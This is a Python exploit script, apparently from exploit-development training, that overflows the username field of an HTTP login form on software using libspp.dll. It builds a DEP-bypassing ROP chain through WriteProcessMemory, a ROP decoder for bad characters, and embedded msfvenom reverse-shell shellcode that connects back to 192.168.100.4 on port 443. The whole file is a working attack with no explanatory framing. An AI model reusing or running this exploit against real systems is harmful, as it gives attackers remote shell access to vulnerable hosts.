import socket
from struct import pack


def map_chars(sh):
    BADCHARS = b'\x00\x0A\x0D\x25\x26\x2B\x3D'
    i = 0
    badIndex = []
    while i < len(sh):
        for c in BADCHARS:
            if sh[i] == c:
                badIndex.append(i)
        i = i+1
    return badIndex


def encode(sh):
    BADCHARS = b'\x00\x0A\x0D\x25\x26\x2B\x3D'
    REPLACECHARS = b"\xff\x09\x0c\x23\x24\x2a\x3c"
    encodedShell = sh
    for i in range(len(BADCHARS)):
        encodedShell = encodedShell.replace(
            pack("B", BADCHARS[i]),
            pack("B", REPLACECHARS[i]))
    return encodedShell


def decode(pos, shellcode):
    badchars = b'\x00\x0A\x0D\x25\x26\x2B\x3D'
    decodebytes = b"\x01\x01\x01\x02\x02\x01\x01"
    stub = []
    value = 0
    for i in range(len(pos)):
        if i == 0:
            offset = pos[i]
        else:
            offset = pos[i] - pos[i - 1]
        offset = (-offset) & 0xffffffff
        for j in range(len(badchars)):
            if shellcode[pos[i]] == badchars[j]:
                value = decodebytes[j] | 0x11111100
                stub.append(0x1005e9f5)  # pop ebp ; ret
                stub.append(offset)
                # sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret ;
                stub.append(0x1014c168)
                stub.append(0x42424242)
                stub.append(0x42424242)
                stub.append(0x42424242)
                stub.append(0x100baecb)  # xchg eax, ecx ; ret
                stub.append(0x1002f729)  # pop eax ; ret
                stub.append(value)
                stub.append(0x101304f9)  # add byte [ecx], al ; ret
                stub.append(0x100baecb)  # xchg eax, ecx ; ret
    return stub


try:
    server = "127.0.0.1"
    port = 80

    va = pack("<L", (0x45454545))  # dummy WriteProcessAddress Address
    va += pack("<L", (0x10167b10))  # Shellcode Return Address
    va += pack("<L", (0xffffffff))  # hProcess
    va += pack("<L", (0x10167b10))  # lpBaseAddress
    va += pack("<L", (0x49494949))  # lpBuffer
    va += pack("<L", (0x51515151))  # nSize
    va += pack("<L", (0x52525252))  # lpNumberOfBytesWritten

    # badchars found: 0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, 0x3D
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.4 LPORT=443 -f python -v shellcode
    shellcode = b""
    shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
    shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
    shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
    shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
    shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
    shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
    shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
    shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
    shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
    shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
    shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
    shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
    shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
    shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
    shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
    shellcode += b"\x6a\x05\x68\xc0\xa8\x64\x04\x68\x02\x00\x01"
    shellcode += b"\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
    shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
    shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
    shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
    shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
    shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
    shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
    shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
    shellcode += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
    shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
    shellcode += b"\x6a\x00\x53\xff\xd5"

    decoder_chain = decode(map_chars(shellcode), shellcode)

    # Reference for WriteProcessMemory
    # BOOL WriteProcessMemory(
    #   [in]  HANDLE  hProcess,
    #   [in]  LPVOID  lpBaseAddress,
    #   [in]  LPCVOID lpBuffer,
    #   [in]  SIZE_T  nSize,
    #   [out] SIZE_T  *lpNumberOfBytesWritten
    # );

    # Getting rop gadget list:
    # rp++ --file libspp.dll --bad-bytes "\x00\x0a\x0d\x25\x26\x2b\x3d" --rop 5 --unique > gadgets.txt
    rop = b""
    ropchainlist = [
        # set edx to beginning of the skeleton
        0x10154112,  # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret ;
        0x42424242,  # stack alignment
        0x10097bfb,  # mov eax, esi ; pop esi ; pop ebx ; ret ;
        0x42424242,  # stack alignment
        0x42424242,  # stack alignment
        0x1005e9f5,  # pop ebp ; ret
        0xffffffdc,  # -0n36 to reach beginning of the skeleton
        0x100fcd71,  # add eax, ebp ; dec ecx ; ret ;
        0x100cb4d4,  # xchg eax, edx ; ret ;

        # get writeprocessmemory address and update it in skeleton
        0x1002f729,  # pop eax ; ret ;
        0x10168040,  # IAT address of GetLastError KERNEL32
        0x1014dc4c,  # mov eax,  [eax] ; ret
        0x101251d2,  # pop ebp ; ret ; Popping the difference to ebp
        0xfffe0560,  # Difference between (GetLastError and WriteProcessMemory)
        0x1014c168,  # sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret ;
        0x42424242,  # stack alignment
        0x43434343,  # stack alignment
        0x44444444,  # stack alignment
        0x1012d24e,  # mov  [edx], eax ; ret ;

        # increase edx to reach lpbuffer
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;

        # update lpbuffer with shellcode address in stack
        0x1002f729,  # pop eax ; ret ;
        0xfffffc8c,  # difference between esp and shellcode
        0x1005a3e6,  # neg eax ; ret ;
        0x100cdc7a,  # xchg eax, ebp ; ret ;
        0x10154112,  # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret ;
        0x10097bfb,  # mov eax, esi ; pop esi ; pop ebx ; ret ;
        0x42424242,  # stack alignment
        0x42424242,  # stack alignment
        0x100fcd71,  # add eax, ebp ; dec ecx ; ret ;
        0x1012d24e,  # mov  [edx], eax ; ret ;

        # ropdecoder
        *decoder_chain,

        # set nSize
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x1002f729,  # pop eax ; ret ;
        0xfffffd44,  # -0n700
        0x1005a3e6,  # neg eax ; ret ;
        0x1012d24e,  # mov  [edx], eax ; ret ;

        # set lpNumberOfBytesWritten
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x100bb1f4,  # inc edx ; ret ;
        0x10011c8a,  # xor eax, eax ; ret ;
        0x1012d24e,  # mov [edx], eax ; ret ;

        # call WriteProcessMemory
        0x100cb4d4,  # xchg eax, edx ; ret ;
        0x1005e9f5,  # pop ebp ; ret
        0xffffffe8,  # -0n24
        0x100fcd71,  # add eax, ebp ; dec ecx ; ret ;
        0x101394a9,  # xchg eax, esp ; ret ;
    ]

    for gadget in ropchainlist:
        rop += pack("<L", (gadget))

    filler = b"A" * (780 - len(va))

    encoded_shellcode = encode(shellcode)

    nops = b"\x90" * 40
    inputBuffer = filler + va + rop + nops + encoded_shellcode
    content = b"username=" + inputBuffer + b"&password=A"

    buffer = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: " + server.encode() + b"\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://" + server.encode() + b"/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
    buffer += b"\r\n"
    buffer += content

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
